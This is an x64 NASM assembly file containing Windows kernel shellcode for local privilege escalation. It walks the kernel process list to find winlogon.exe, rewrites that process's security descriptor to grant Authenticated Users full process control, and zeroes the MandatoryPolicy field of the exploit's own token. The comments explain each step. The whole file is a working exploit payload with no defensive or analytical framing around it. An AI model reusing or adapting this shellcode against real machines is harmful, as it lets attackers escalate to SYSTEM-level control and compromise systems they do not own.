BITS 64

section .text

	nop

	mov r8, qword [gs:0x188]					; Get _KTHREAD Address into r8
	mov r8, qword [r8 + 0x220]					; Get _EPROCESS Address
	mov rcx, r8									; save Exploit process' _EPROCESS structure on rcx

	loop1:
		mov r8, qword [r8 + 0x448]				; move the flink into r8
		sub r8, 0x448							; go back to the start of the struct
		cmp dword [r8+0x5a8], 0x6C6E6977		; compare if it is equal to the first 4 characters "winl" (little endiand so "lniw")
		jnz loop1

	sub r8, 0x30								; get the _OBJECT_HEADER of winlogon.exe
	mov r8, [r8 + 0x28]							; move to the SecurityDescriptor parameter
	and r8, 0xfffffffffffffff0					; get the pointer to the object instead the fast reference pointer
	mov byte [r8+0x20+0x28], 0x0b				; _SECURITY_DESCRIPTOR + 0x20 (DACL start) + 0x28 (byte we want to change); 0x12 (SYSTEM) -> 0x0b (Authenticated Users; sid S-1-5-18 (SYSTEM) Full Process Control -> S-1-5-11 Full Process Control (Authenticated Users)
	mov rcx, [rcx+0x4b8]						; get the exploit process' _TOKEN structure
	and rcx, 0xfffffffffffffff0					; get the pointer to the object and not the fast reference
	mov byte [rcx + 0x0d4], 0x0					; set MandatoryPolicy to 0 (open handle to any process besides the privilege)

	nop
	ret

end